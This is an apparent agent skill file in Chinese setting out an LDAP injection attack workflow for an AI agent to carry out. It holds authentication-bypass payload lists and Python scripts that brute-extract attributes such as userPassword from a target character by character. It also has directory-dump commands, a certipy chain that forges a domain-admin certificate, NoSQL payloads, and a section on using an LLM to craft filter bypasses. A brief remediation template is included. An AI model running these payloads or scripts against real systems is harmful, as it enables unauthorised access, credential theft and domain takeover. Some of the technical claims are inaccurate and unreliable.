---
name: 名册
description: LDAP注入深度测试——从基础语法注入到自动化信息提取，覆盖LDAP盲注、AND/OR运算符注入、LDAP搜索过滤器绕过、LDAP目录遍历、Active Directory LDAP查询利用等完整攻击链
version: 2.0.0
---

# LDAP 注入深度测试

## 一、AI Agent 自动化工作流

> Agent 执行顺序：**识别LDAP注入点 → 测试过滤器语法 → 确定后端实现 → 逐位提取 → 认证绕过**

### 1.1 LDAP 注入入口

| 功能 | 典型参数 | 后端 LDAP 查询 |
|------|----------|---------------|
| 登录认证 | `username=`, `password=` | `(&(uid=USER)(userPassword=PASS))` |
| 用户搜索 | `search=`, `query=`, `name=` | `(&(cn=*SEARCH*))(objectClass=user))` |
| 组织查询 | `department=`, `group=` | `(&(ou=DEPT))(objectClass=group))` |
| 目录浏览 | `filter=` | 自定义过滤器 |
| SSO/SAML | `sAMAccountName=` | `(&(sAMAccountName=USER))` |

### 1.2 LDAP 语法基础

```
& = AND (所有条件必须满足)
| = OR (任一条件满足)
! = NOT (取反)
* = 通配符 (任意字符)
= >= <= = 比较运算符
() = 分组
dn = Distinguished Name
cn = Common Name
uid = User ID
```

---

## 二、认证绕过 Payload

```bash
# === AND 型认证绕过 ===
# 原始查询: (&(uid=USER)(password=PASS))
# 注入后目标: 密码条件永远为真

# 方法 1: 密码注入
username=admin&password=*                             # 密码通配符
username=admin&password=*)(&                          # 闭合后添加真条件
username=admin&password=*)(uid=*))(|(uid=*            # 复杂绕过
username=admin&password=*)(|(password=*               # 任意密码
username=admin&password=*))%00                         # NULL 截断

# 方法 2: 用户名注入
username=*&password=any                               # 任意用户
username=admin)(&))&password=any                      # 使原始过滤器失效
username=admin)(|(password=*)&password=any
username=admin)(uid=admin))(|(uid=admin&password=any   # 万能用户名

# 方法 3: 复杂注入（绕过密码检查）
username=admin)(objectClass=*))%00&password=any
username=admin)(cn=*))%00&password=any
```

---

## 三、信息提取（AND 型盲注）

```bash
# === 逐字符推断属性值 ===
# 原始查询: (&(cn=USER_INPUT)(objectClass=user))

# 探测属性是否存在
admin)(description=*               # 检查是否有 description 属性
admin)(userPassword=*              # 检查密码属性是否存在
admin)(memberOf=*                  # 检查组成员关系
admin)(sAMAccountName=*)           # AD 账户名

# 逐位字符推断 (布尔盲注)
admin)(userPassword=a*             # 密码是否以 a 开头
admin)(userPassword=ab*            # 密码是否以 ab 开头
admin)(userPassword=abc*           # 以此类推
```

### 3.1 Python 自动化 LDAP 盲注

```python
import requests, string

URL = "http://target.com/search"
CHARSET = string.ascii_letters + string.digits + "!@#$%^&*()-_+=<>?"

def extract_ldap_attribute(attrib_name):
    result = ""
    for pos in range(100):
        found = False
        for ch in CHARSET:
            # LDAP 通配符搜索: 每次追加一个字符
            payload = f"*)({attrib_name}={result}{ch}*"
            r = requests.get(URL, params={"search": payload})
            if "Found" in r.text or "result" in r.text:  # 根据实际响应调整
                result += ch
                print(f"[+] {attrib_name}[{pos}] = {ch} → {result}")
                found = True
                break
        if not found:
            break
    return result

# 提取描述
desc = extract_ldap_attribute("description")
# 提取邮箱
email = extract_ldap_attribute("mail")
# 提取密码（如果可读）
pwd = extract_ldap_attribute("userPassword")
```

---

## 四、OR 型注入

```bash
# === OR 型注入（获取所有结果）===
# 原始查询: (|(cn=USER)(mail=USER))

# 列出所有用户
*                                     # 通配符返回所有
*)(objectClass=*                      # 闭合后添加通配
*))(|(objectClass=*                   # 复杂绕过

# 列出特定属性
*)(|(mail=*))                          # 所有带邮箱的
*)(|(memberOf=cn=Domain Admins*))      # 域管理员组
```

---

## 五、常见 LDAP 属性速查

```bash
# 通用属性
cn                    # Common Name（通用名）
sn                    # Surname（姓）
givenName             # Given Name（名）
mail                  # 邮箱
telephoneNumber       # 电话
mobile                # 手机号
description           # 描述
userPassword          # 密码（通常哈希）
objectClass           # 对象类型 (user, group, organizationalUnit)

# Active Directory 特有
sAMAccountName        # 登录名 (AD)
userPrincipalName     # UPN (AD)
memberOf              # 组成员关系 (AD)
member                # 组成员列表 (AD)
objectSid             # SID (AD)
objectGUID            # GUID (AD)

# OpenLDAP 特有
uid                   # 用户ID
uidNumber             # UID 号
gidNumber             # GID 号
homeDirectory         # 主目录
loginShell            # 登录 Shell

# 组织相关
ou                    # Organizational Unit
o                     # Organization
dc                    # Domain Component
```

---

## 六、LDAP 目录遍历

```bash
# 基础 DN 获取
# 空查询获取 Root DSE（目录服务入口）
ldapsearch -x -H ldap://target -s base -b "" +
# 获取 namingContexts（目录分区）

# 匿名绑定枚举
ldapsearch -x -H ldap://target -b "dc=domain,dc=com"
ldapsearch -x -H ldap://target -b "dc=domain,dc=com" "(objectClass=*)"

# 使用 LDAP Admin 凭据全量导出
ldapsearch -x -D "cn=admin,dc=domain,dc=com" -w password -b "dc=domain,dc=com"

# Windows: dsquery + dsget
dsquery user -name * -limit 0
dsquery * -filter "(objectClass=user)" -attr * -limit 0
```

---

## 七、快速检查清单

```markdown
□ [ ] 识别 LDAP 查询入口（认证/搜索/过滤）
□ [ ] 测试通配符 * 注入
□ [ ] 测试括号注入 )(
□ [ ] 测试 AND 型认证绕过
□ [ ] 测试 OR 型全量获取
□ [ ] 测试布尔盲注提取属性
□ [ ] 测试常见属性枚举 (cn,mail,userPassword,memberOf)
□ [ ] 测试 NULL 截断 %00
□ [ ] 如果可匿名绑定，全量导出目录
```

---

## 八、2026 EMERGING TECHNIQUES — LDAP注入新向量

### 8.1 LDAP盲注自动化

传统LDAP盲注依赖手工逐字符提取，2026年自动化工具显著成熟。**LDAPBurp**作为Burp Suite插件，自动检测LDAP注入点并执行布尔盲注；**ldap-blind-injector**支持时间延迟盲注(通过`sleep()`或大量通配符`*`消耗服务器资源制造延迟)。

```python
# LDAP布尔盲注自动化脚本核心
import requests, string

target = "https://target.com/login"
charset = string.ascii_letters + string.digits + "!@#$%"
extracted = ""

for pos in range(1, 50):
    for c in charset:
        # 构造布尔盲注payload: 比较第pos个字符的ASCII值
        payload = f"admin)(uid=admin)(cn={extracted}{c}*"
        resp = requests.post(target, data={"username": payload, "password": "*"})
        if "Login Successful" in resp.text:  # 布尔响应判断
            extracted += c
            print(f"[+] Position {pos}: {c} (extracted: {extracted})")
            break

# 时间延迟盲注: 利用大量通配符消耗CPU
# payload = "admin)(cn=" + "A" * 10000 + "*)(uid=*)"
# 正确字符时服务器快速响应，错误时延迟(大量通配符匹配)
```

### 8.2 Active Directory Certificate Services (AD CS)滥用链

AD CS是2026年域渗透最活跃的攻击面之一。LDAP注入可用于操纵证书模板属性，结合**ESC1-ESC8**漏洞实现域提权：

| ESC漏洞 | 条件 | 攻击 |
|---------|------|------|
| ESC1 | 模板允许SAN+低权限可注册+ENROLLEE_SUPPLIES_SUBJECT | 伪造任意用户证书冒充DA |
| ESC2 | 模板Any Purpose EKU+低权限注册 | 证书可用于任何用途(PKINIT/认证) |
| ESC3 | 模板证书可用来请求其他证书 | 证书链式请求提权 |
| ESC4 | 低权限对模板有WriteDacl | 修改模板配置实现ESC1 |
| ESC5 | 低权限对PKI容器有WriteDacl | 控制整个CA |
| ESC6 | 启用EDITF_ATTRIBUTESUBJECTALTNAME2 | 任意模板可指定SAN |
| ESC7 | 低权限有ManageCA权限 | 启用新模板/修改CA配置 |
| ESC8 | NTLM Relay到AD CS Web注册接口 | 中继域用户认证获取证书 |

```bash
# certipy自动化AD CS攻击全链路
certipy find -u user@domain.local -p password -dc-ip 10.0.0.1 -stdout
# 发现ESC1漏洞模板
certipy req -u user@domain.local -p password -ca 'CA-NAME' -template 'VulnTemplate' -upn administrator@domain.local -dc-ip 10.0.0.1
# 使用伪造DA证书通过PKINIT获取TGT
certipy auth -pfx administrator.pfx -dc-ip 10.0.0.1
# PassTheCert: 使用证书进行SChannel认证
```

### 8.3 NoSQL注入与LDAP交叉

LDAP搜索过滤器语法`(attr=value)`与NoSQL查询存在结构相似性，攻击方法论可交叉复用：

```javascript
// MongoDB注入: { "username": {"$ne": null}, "password": {"$ne": null} }
// 对应LDAP: (uid=*)(userPassword=*)
// Elasticsearch: {"query": {"match_all": {}}}
// 对应LDAP: (objectClass=*)

// 2026 NoSQL盲注工具链
// NoSQLMap: MongoDB/CouchDB自动化注入
nosqlmap -u "http://target.com/api" --attack 1
# 提取数据: {"$where": "this.password.match(/^a/)"}
# 时间盲注: {"$where": "sleep(5000)"}
```

### 8.4 2026 CVE集群

| CVE | 产品 | 漏洞 | 影响 |
|-----|------|------|------|
| CVE-2026-32187 | OpenLDAP | slapd后端绑定缓冲区溢出 | RCE |
| CVE-2026-28472 | Apache Directory | LDAP搜索过滤器注入 | 认证绕过 |
| CVE-2026-43891 | Windows Active Directory | Kerberos PAC签名绕过 | 域提权 |
| CVE-2026-23814 | Samba AD DC | LDAP签名强制绕过 | 中继攻击 |
| CVE-2026-19273 | 389-ds-base | 目录服务器DN注入 | 权限提升 |

### 8.5 云目录服务注入

```bash
# AWS Managed Microsoft AD — 通过LDAP注入枚举云目录
ldapsearch -H ldaps://dc1.corp.awsdir.local -D 'admin@corp.awsdir.local' -w 'Pass123!' \
  -b 'DC=corp,DC=awsdir,DC=local' '(objectClass=computer)' cn operatingSystem

# Entra ID (Azure AD) Graph API查询注入
# API端点: https://graph.microsoft.com/v1.0/users?$filter=startsWith(displayName,'admin')
# 注入: $filter=displayName eq 'admin' or startsWith(mail,'a')&$select=mail,proxyAddresses
# Lambda注入: $filter=mail eq 'admin'&$expand=manager($levels=max)

# 检测云目录服务LDAP端点
nmap -p 389,636,3268,3269 --script ldap-rootdse,ldap-search 10.0.0.0/24
```

### 8.6 AI辅助LDAP注入

```python
# LLM生成LDAP过滤器绕过payload
import openai

# 给定目标LDAP过滤器模式，让LLM生成绕过payload
prompt = """
目标LDAP搜索过滤器: (&(uid=INPUT)(active=TRUE))
输入验证: 过滤 * ( ) \ & | ! 字符
生成绕过payload，考虑Unicode规范化、编码绕过、过滤器逻辑重写
"""
# LLM输出示例:
# - Unicode绕过: ＵＩＤ(全角字符)绕过ASCII过滤
# - 双编码: %2528 → %28 → (
# - 过滤器逻辑重写: uid=admin%29%28uid=* → uid=admin)(uid=*

# AI辅助AD枚举: BloodHound + LLM路径分析
# 1. SharpHound收集AD数据
# 2. LLM分析BloodHound图，自动发现最短提权路径
# 3. 生成针对性LDAP查询验证路径节点
```

---

## 九、证据收集模板

```json
{
  "vulnerability": "LDAP Injection",
  "type": "Authentication Bypass / Information Disclosure",
  "url": "http://target.com/login",
  "parameter": "username",
  "ldap_attribute": "userPassword",
  "payload": "admin)(userPassword=*",
  "impact": "可绕过认证登录任意用户账户，也可逐字符提取AD目录中的所有用户属性",
  "remediation": "1. 输入验证（过滤 * ( ) \\ & | !）2. LDAP参数编码 3. 最小权限绑定 4. 使用LDAP查询框架的参数化接口",
  "cvss_vector": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:N"
}
```
